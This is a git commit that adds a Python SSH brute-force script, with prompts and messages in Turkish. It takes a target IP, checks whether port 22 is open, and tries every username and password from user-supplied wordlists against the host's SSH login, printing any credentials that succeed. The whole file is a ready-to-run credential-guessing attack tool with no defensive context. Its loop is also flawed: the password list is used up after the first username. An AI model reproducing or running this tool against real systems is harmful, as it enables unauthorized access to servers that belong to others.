2ec11b188cfdf9705ca52aa3c0f485320ac81845
RAMO <156857438+RamoDigitalMaestro@users.noreply.github.com>
2024-04-02 03:36:44 +0300

    sshbruteforce.py

---
+++ sshbruteforce.py
@@ -0,0 +1,49 @@
+import socket
+from colorama import Fore
+import paramiko
+
+ip = input("Hedef İp Giriniz : ")
+port = 22
+
+def port_tara(ip, port):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(1.25)
+        s.connect((ip, port))
+        print(Fore.GREEN + "{} [√] portu açık. Lütfen Bekleyin...".format(port))
+        s.close()
+    except socket.error:
+        print(Fore.RED + "{} [×] portu kapalı. Tool'dan çıkılıyor...".format(port))
+        exit()
+        
+        
+port_tara(ip, port)
+
+
+usernamelist = input("SSH kullanıcı adı wordlistini giriniz: ")
+passwordlist = input("SSH şifre wordlistini giriniz: ")
+
+
+
+def ssh_brute():
+    with open(usernamelist, 'r') as users:
+        with open(passwordlist, 'r') as passwords:
+            for username in users:
+                username = username.strip() 
+                for password in passwords:
+                    password = password.strip()
+                    ssh = paramiko.SSHClient()
+                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                    
+                    try:
+                        ssh.connect(hostname=ip, port=port, username=username, password=password)
+                        print(Fore.GREEN + "[✓] Başarılı. Şifre ve Kullanıcı adı Bulundu ", "Kullanıcı Adı:", username, "Şifre:", password)
+                        ssh.close()  
+                        return  
+                    except paramiko.AuthenticationException:
+                        print(Fore.RED + "[×] Başarısız Kullanıcı adı ve Şifre Bulunamadı")
+                    except paramiko.SSHException as e:
+                        print(Fore.RED + f"[×] SSH bağlantı hatası: {e}")
+
+
+ssh_brute()
